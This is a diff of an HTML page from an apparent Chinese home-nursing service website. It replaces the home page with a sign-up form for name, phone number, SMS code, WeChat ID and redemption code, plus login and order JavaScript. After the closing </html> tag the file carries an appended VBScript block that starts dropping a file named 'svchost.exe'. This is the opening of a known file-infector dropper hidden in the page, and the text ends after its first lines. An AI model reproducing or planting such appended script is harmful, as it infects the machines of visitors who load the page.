@@ -3,192 +3,353 @@
 
 	<head>
 		<meta charset="utf-8">
-		<title>金牌护士|护士上门 养老护理 医疗体检 就医陪诊 美白针 上门打针输液</title>
-		<meta name="keywords" content="护士上门 上门护理 医护到家 养老护理 医疗体检 就医陪诊 美白针 上门打针输液换药">
-		<meta name="description" content="金牌护士是一家提供上门健康服务的O2O平台。核心服务包括养老护理、医学康复、家庭病房、上门打针输液、母婴护理等多种上门医护服务。服务面积已覆盖北京、上海、广州、深圳、重庆、天津、江苏、浙江、山东、山西、湖北、辽宁、广东、吉林等省市提供上门健康服务">
+		<title>填写信息</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
 		<meta name="apple-mobile-web-app-capable" content="yes">
 		<meta name="apple-mobile-web-app-status-bar-style" content="black">
-		<link rel="stylesheet" href="/assets/css/mui.min.css" />
-		<script src="/assets/js/index/before.js"></script>
 		<!--#include file="/common/head.html"-->
-		<link rel="stylesheet" href="/assets/css/swiper.min.css">
 	</head>
 
 	<body>
-		<nav class="mui-bar mui-bar-tab">
-			<div class="mui-tab-item mui-active" onclick="shouye()">
-				<span class="mui-icon mui-icon-home">
-					<img src="/assets/img/shouye_o.png" id="img1"/>
-				</span>
-				<span class="mui-tab-label mt-5">首页</span>
-			</div>
-			<div class="mui-tab-item" onclick="nurse()">
-				<span class="mui-icon mui-icon-email">
-					<img src="/assets/img/hus_n.png" id="img2"/>
-				</span>
-				<span class="mui-tab-label mt-5">护士</span>
-			</div>
-			<div class="mui-tab-item" onclick="i_jingxuan()">
-				<span class="mui-icon mui-icon-contact">
-					<img src="/assets/img/jingxuan_n.png" id="img3"/>
-				</span>
-				<span class="mui-tab-label mt-5">精选</span>
-			</div>
-			<div class="mui-tab-item" onclick="tz_p()">
-				<span class="mui-icon mui-icon-gear">
-					<img src="/assets/img/geren_n.png" id="img4">
-				</span>
-				<span class="mui-tab-label mt-5">个人中心</span>
-			</div>
-		</nav>
-		<div class="mui-content" style="display: none;">
-			<div class="indexlb_head_bg">
-			</div>
-			<div class="indexlb_head">
-				<div onclick="personal()">
-					<span class="ml-10" id="index_city"></span>
-					<span class="public-horn-135 ml-5"></span>
+		<section class="patient_section">
+			<div class="public_list patient pa_name">
+				<span>姓名：</span>
+				<div>
+					<input type="text" placeholder="请输入真实姓名" id="name" maxlength="5" class="fz-14" value="">
 				</div>
-				<!--	<div>
-					<span class="ml-10" id="index_city"></span>
-					<span class="public-horn-135 ml-5"></span>
-				</div>-->
+
 			</div>
-			<div class="swiper-container" id="slither">
-				<div class="swiper-wrapper">
+			<div class="public_list patient">
+				<span>手机号码：</span>
+				<div>
+					<input type="tel" placeholder="请输入手机号码" id="phoneCode" maxlength="11" class="fz-14" width="100%" value="">
 				</div>
-				<div class="swiper-pagination"></div>
+
 			</div>
-			<div class="index_l">
+			<div class="public_list patient family_yzm">
+				<span></span>
+				<div>
+					<input type="tel" placeholder="请填写验证码" id="code" maxlength="4" class="fz-14" value="">
+					<button onclick="getCode()" class="family_phone fz-14" id="code_btn">获取验证码</button>
+				</div>
+
 			</div>
-			<div class="index_g mt-10" onclick="tanfang()" >
-				<img src="" class="img-responsive"/>
+			<div class="public_list patient pa_name public_bd_no">
+				<span>微信号：</span>
+				<div>
+					<input type="text" maxlength="20" placeholder="请填写微信号码" id="wechatId" class="fz-14" width="100%" value="" />
+				</div>
+
 			</div>
-			<section class="index_zx mt-10">
-				<div class="public-cell">
-					<img src="/assets/img/shouye_jiankangzixun.png" />
-
-					<span class="index_zx_bt" onclick="newlist()">					
-					健康资讯					
-				    </span>
-
-					<div class="public_primary index_zx_top">
-						<ul id="zx">
-						</ul>
-
-					</div>
+			<div class="public_list patient pa_name public_bd_no" id="codeHide">
+				<span>兑换码：</span>
+				<div>
+					<input type="text" maxlength="8" placeholder="请填写兑换码" id="dhCode" class="fz-14" width="100%" />
 				</div>
-			</section>
-			<section class="index_tj clearfix">
-				<div class="public-cell pull-left" onclick="dingzhifuwu()">
-					<img src="/assets/img/shouye_dingzfuwu.png" />
-					<div class="public_primary index_dz">
-						<h1>定制服务</h1>
-						<!--<p>我我我我我我我我</p>-->
-					</div>
-				</div>
-				<div class="public-cell pull-right" onclick="xptj()">
-					<img src="/assets/img/shouye_xinpintuijian.png" />
-					<div class="public_primary index_dz">
-						<h1>新品推荐</h1>
-						<!--<p>我我我我我我我我</p>-->
-					</div>
-				</div>
-			</section>
-			<section class="index_rm">
-				<header class="public-cell public-cell-0">
-					<img src="/assets/img/shouye_remenfuwu.png" />
-					<p>热门服务</p>
-				</header>
-				<div id="rm">
-				</div>
-			</section>
-
-		</div>
-		<!--#include file="/common/toastDialog.html"-->
-		<!--#include file="/common/toastLoading.html"-->
-		<script src="/assets/js/swiper.min.js"></script>
-		<script src="/assets/js/index/index.js"></script>
-		<!--<script src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>-->
-		<script src="/assets/js/layer/layer.js"></script>
-		<script src="/assets/js/login/index.js"></script>
-		<script>
-			$(function() {
-				var pids = "";
-
-				if(!localStorageIsNotnull("pid")) {
-					pids = getlocalStorage("pid");
-				}
-				clearLocalStorage(0);
-				if(!IdValStrnigs("pids")) {
-					setlocalStorage("pid", pids);
-				}
-			})
-
-			var _script = document.createElement('script');
-			_script.type = "text/javascript";
-			_key = "x2HN3bqmnQTDqPQbcupExKulGRdWbzak"; //百度地图可以申请到
-			_script.src = "https://api.map.baidu.com/location/ip?ak=" + _key + "&coor=bd09ll&callback=citycallback"; //拼接URL
-			document.head.appendChild(_script);
-
-			function citycallback(data) {
-				console.log(data);
-				var city = data.content.address_detail.city;
-				var city1 = sessionStorage.getItem("set_index_city");
-				if(city1 != "" && city1 != null) {
-					$("#index_city").html(city1);
-					sessionStorage.setItem("city_dw1", $("#index_city").html());
-				} else {
-					$("#index_city").html(city);
-					sessionStorage.setItem("city_dw1", city);
-				}
-
-			}
-
-			function shouye() {
-				window.location.href = path + '/index.html';
-			}
-
-			function tanfang() {
-				window.location.href = path + '/product/visit/index.html';
-			}
-
-			function dingzhifuwu() {
-				if(localStorageIsNotnull("set")) {
-					window.location.href = "/login/loginAmong.html";
-				}
-				var infoid = localStorage.getItem("set");
-				//console.log(JSON.parse(infoid).id)
-				if(IdValStrnigs(infoid)) {
-					window.location.href = "/login/loginAmong.html";
-				} else {
-					window.location.href = path + '/product/custom/customServer.html';
-				}
-
-			}
-
-			function nurse() {
-				window.location.href = path + '/nurse/index.html'
-			}
-
-			function i_jingxuan() {
-				window.location.href = path + '/activity/index.html';
-			}
-
-			function personal() {
-				window.location.href = path + '/location.html';
-			}
-
-			function newlist() {
-				window.location.href = path + '/news/index.html';
-			}
-
-			function xptj() {
-				window.location.href = path + "/product/goods/index.html";
-			}
-		</script>
+			</div>
+		</section>
+		<p id="codeHides" class="p-10">*此服务限时兑换，活动截止时间为10月8日</p>
+		<footer class="sv_foot">
+			<button onclick="ifUserLogin();">立即签约</button>
+		</footer>
 	</body>
+	<script type="text/javascript">
+		$(function() {
+			//$("#dhCode").html(Math.random().toString(36).substr(2, 8));
+			if(userProving()) {
+				$(".family_yzm").addClass("hide");
+				$("#name").val(getUserName());
+				$("#phoneCode").val(getUserPhone());
+			}
+			if(getlocalStorage("familyAccessMode") == 3){
+				$("#dhCode").val(Math.random().toString(36).substr(2, 8));
+			}
+			if(getlocalStorage("familyAccessMode") == 1){
+				$("#codeHide").addClass("hide");
+				$("#codeHides").addClass("hide");
+			}
+		})
+		
+		//动态改变时间
+		function CountDown() {
+			if(boo == false) {
+				maxtime = 59;
+				boo = true;
+			}
+			if(maxtime > 0) {
+				seconds = Math.floor(maxtime % 60);
+				msg = seconds + "秒"; //动态显示剩余时间。
+				document.all["code_btn"].innerHTML = msg;
+				maxtime = maxtime - 1;
+			} else {
+				clearInterval(timer);
+				document.all["code_btn"].innerHTML = '获取验证码';
+			}
+		}
+
+		function ifUserLogin() {
+			if(userProving()) {
+				param = {
+					userId: getUserId(),
+				}
+				sendAjaxTrue(userIfFamily, param, "json", userIfFamilyCallBackss);
+			} else {
+				public_login();
+			}
+		}
+
+		function userIfFamilyCallBackss(data) {
+			if(data.result == 1) {
+				window.location.href = "/personal/privilege/family/mynurse.html";
+			} else {
+				setfamilyOrderCallback();
+			}
+		}
+
+		function public_login() {
+			var tel = $('#phoneCode').val();
+			if(IdVal("name")) {
+				layer.msg("请填写姓名", {
+					time: 900
+				});
+				return;
+			}
+			if(IdVal("phoneCode")) {
+				layer.msg("请填写手机号", {
+					time: 900
+				});
+				return;
+			}
+			if(!/^1[3|5|7|8]\d{9}$/.test(tel)) {
+				layer.msg("请输入正确的电话号码", {
+					time: 900
+				});
+				return;
+			}
+			if(IdVal("code")) {
+				layer.msg("请填写验证码", {
+					time: 900
+				});
+				return;
+			}
+			var userOpenID = "";
+			if(!localStorageIsNotnull("userOpenID")) {
+				userOpenID = getlocalStorage("userOpenID");
+			}
+			var name_f = $("#name").val();
+			setlocalStorage("familyName", name_f);
+			param = {
+				phone: $("#phoneCode").val(),
+				smsCode: $("#code").val(),
+				type: 1,
+				openid: userOpenID,
+				name: name_f,
+			}
+			sendAjaxTrue(login1, param, "json", loginCodeCallBack);
+		}
+
+		function loginCodeCallBack(data) {
+			console.log(data)
+			if(data.resultcode == 0) {
+				layer.msg(data.msg, {
+					time: 900
+				});
+				return;
+			}
+			var userValue = '{"phone":"' + data.result.phone + '","id":"' + data.result.id + '","token":"' + data.result.token + '","name":"' + data.result.name + '"}';
+			var openid_login = '';
+			if(!IdValStrnigs(data.result.phone.openid)) {
+				setlocalStorage("userOpenID", data.result.phone.openid);
+			}
+			localStorage.setItem("set", userValue);
+			var wechatId = $("#wechatId").val();
+			if(!IdValStrnigs(wechatId)) {
+				setlocalStorage("wechatId", wechatId);
+			}
+			param = {
+				userId: data.result.id,
+			}
+			sendAjaxTrue(userIfFamily, param, "json", userIfFamilyCallBack);
+			//			userIfFamily
+			//window.location.href = "/product/familyPay.html";
+		}
+
+		function userIfFamilyCallBack(data) {
+			if(data.result == 1) {
+				window.location.href = "/personal/privilege/family/mynurse.html";
+			} else {
+				setfamilyOrderCallback();
+			}
+		}
+		function setfamilyOrderCallback() {
+			//getlocalStorage("familyPayPrice");
+			//getlocalStorage("fmId");
+			var familyAccessMode = getlocalStorage("familyAccessMode");
+			
+			var wechatId = "";
+			if(!localStorageIsNotnull("wechatId")) {
+				wechatId = getlocalStorage("wechatId");
+			}
+			if(familyAccessMode == 1) {
+				if(IdVal("name")) {
+					layer.msg("请填写姓名", { time: 900 });
+					return false;
+				}
+				setlocalStorage("familyName",$("#name").val());
+				window.location.href = "/product/familyPay.html";
+				//layer.msg("暂未开通，请通过其他途径获取", { time: 900 });
+			} else if(familyAccessMode == 2) {
+				if(IdVal("name")) {
+					layer.msg("请填写姓名", { time: 900 });
+					return false;
+				}
+				//layer.msg("暂未开通，请通过其他途径获取", { time: 900 });
+				if(IdVal("dhCode")){
+					layer.msg("请输入兑换码！", { time: 900 });
+					return false;
+				}
+				param = {
+					promoCode: getlocalStorage("familyPromoCode"),
+					userId: getUserId(),
+					wxNo: $("#wechatId").val(),
+					card: $("#dhCode").val(),
+					name: $("#name").val(),
+					fmId: getlocalStorage("fmId"),
+					payType: 1,
+					code : getlocalStorage("familyOCcode"),
+					accessMode :familyAccessMode,
+				}
+				sendAjaxTrue(setfamilyOrder, param, "json", setfamilyOrderCallBack);
+				
+			} else if(familyAccessMode == 3) {
+				param = {
+					promoCode: getlocalStorage("familyPromoCode"),
+					userId: getUserId(),
+					wxNo: $("#wechatId").val(),
+					card: "",
+					name: $("#name").val(),
+					fmId: getlocalStorage("fmId"),
+					payType: 1,
+					code : getlocalStorage("familyOCcode"),
+					accessMode :familyAccessMode,
+				}
+				sendAjaxTrue(setfamilyOrder, param, "json", setfamilyOrderCallBack);
+			}
+		}
+
+		function setfamilyOrderCallBack(data) {
+			console.log(data)
+			if(data.resultcode == 1) {
+				window.location.href = "/personal/privilege/family/mynurse.html";
+			} else {
+				layer.msg(data.msg, {
+					time: 900
+				});
+			}
+		}
+		/**
+		 * 点击获取验证码
+		 * 
+		 * 
+		 */
+		function getCode() {
+			var tel = $('#phoneCode').val();
+			if(IdVal("name")) {
+				layer.msg("请填写姓名", {
+					time: 900
+				});
+				return;
+			}
+			if(IdVal("phoneCode")) {
+				layer.msg("请填写手机号", {
+					time: 900
+				});
+				return;
+			}
+			if(!/^1[3|5|7|8]\d{9}$/.test(tel)) {
+				layer.msg("请输入正确的电话号码", {
+					time: 900
+				});
+				return;
+			}
+			//电话号码填写正确  可以发送短信验证码
+			else {
+				if($('#code_btn').html() == "获取验证码") {
+					$('#code_btn').html("60秒");
+					boo = false;
+					timer = setInterval("CountDown()", 1000);
+					param = {
+						phone: $("#phoneCode").val(),
+					}
+					sendAjaxTrue(yzm, param, "json", "");
+				}
+			}
+		}
+		/**
+		 * 判断用户是否登录
+		 */
+		function userProving() {
+			if(localStorageIsNotnull("set")) {
+				return false;
+			}
+			var infoid = JSON.parse(getlocalStorage("set"));
+			if(IdValStrnigs(infoid)) {
+				return false;
+			}
+			if(IdValStrnigs(infoid.phone) || IdValStrnigs(infoid.id) || IdValStrnigs(infoid.name)) {
+				return false;
+			}
+			//	setlocalStorage("userOpenID",data.result.phone.openid);
+			if(isWeiXin()) {
+				if(localStorageIsNotnull("userOpenID")) {
+					return false;
+				}
+			}
+			return true;
+		}
+
+		function getUserId() {
+			if(localStorageIsNotnull("set")) {
+				return '';
+			}
+			var infoid = JSON.parse(getlocalStorage("set"));
+			if(IdValStrnigs(infoid)) {
+				return '';
+			}
+			if(IdValStrnigs(infoid.phone) || IdValStrnigs(infoid.id) || IdValStrnigs(infoid.name)) {
+				return '';
+			}
+			return infoid.id;
+		}
+
+		function getUserPhone() {
+			if(localStorageIsNotnull("set")) {
+				return '';
+			}
+			var infoid = JSON.parse(getlocalStorage("set"));
+			if(IdValStrnigs(infoid)) {
+				return '';
+			}
+			if(IdValStrnigs(infoid.phone) || IdValStrnigs(infoid.id) || IdValStrnigs(infoid.name)) {
+				return '';
+			}
+			return infoid.phone;
+		}
+
+		function getUserName() {
+			if(localStorageIsNotnull("set")) {
+				return '';
+			}
+			var infoid = JSON.parse(getlocalStorage("set"));
+			if(IdValStrnigs(infoid)) {
+				return '';
+			}
+			if(IdValStrnigs(infoid.phone) || IdValStrnigs(infoid.id) || IdValStrnigs(infoid.name)) {
+				return '';
+			}
+			return infoid.name;
+		}
+	</script>
 
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
